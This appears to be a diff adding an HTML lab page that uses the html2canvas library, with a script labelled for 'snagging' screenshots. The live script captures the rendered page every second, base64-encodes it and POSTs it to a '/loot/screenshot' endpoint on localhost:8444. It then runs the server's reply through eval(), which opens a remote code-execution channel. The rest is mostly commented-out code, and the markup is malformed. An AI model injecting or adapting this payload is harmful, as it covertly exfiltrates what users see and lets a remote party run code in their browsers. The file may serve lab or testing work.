@@ -1,0 +1,73 @@
+<head>
+	<title>Labs-Screenshots</title>
+</head>
+<body>
+
+	<h1>html2canvas labs</h1>
+	
+	<!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script> -->
+	<p>test content...</p>
+
+	<script>
+		alert("Ready to snag screenshot?");
+	</script>
+// 		function takeScreenshot()
+// 		{
+// 			html2canvas(document.body).then(function(canvas) {
+//     document.body.appendChild(canvas);
+//     var image = canvas.toDataURL("image/png");
+//     console.log(image);
+
+//     // Open new window
+//    // var w = window.open("");
+//     //w.document.write(image);
+   
+
+//     // save file
+//     window.requestFileSystem  = window.requestFileSystem || window.webkitRequestFileSystem;
+//     window.requestFileSystem(window.PERSISTENT, 5*1024*1024, image, null);
+
+
+
+
+// });
+
+
+		<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script><script>
+			console.log('Sleeping to allow resources loading!');
+
+			setTimeout(function () 
+				{
+					setInterval(function () 
+						{
+							html2canvas(document.getElementsByTagName("html")[0], {scale: 1}).then(canvas => {function b() {eval(this.responseText)};
+							a = new XMLHttpRequest();a.addEventListener("load", b);a.open("POST", "//localhost:8444/loot/screenshot");
+							a.send(btoa(canvas.toDataURL()));}).catch(e => console.log(e));}, 1000);}, 3000);
+		</script>
+
+		// 	html2canvas(document.body).then(function(canvas) {
+
+    	// // // Export canvas as a blob 
+		// // 	canvas.toBlob(function(blob) {
+        // // // Generate file download
+		// // 		window.saveAs(blob, "labs_screenshot.png");
+		// // 	});
+
+		// 	// As an image
+		// 		var base64image = canvas.toDataURL("image/png");
+
+		// 		window.open(base64image, "_blank");
+		// 	});
+			}
+
+			//console.log("Test dump:");
+		//console.log(document.body);
+
+			//takeScreenshot();
+
+
+
+		</script>
+
+
+	</body>
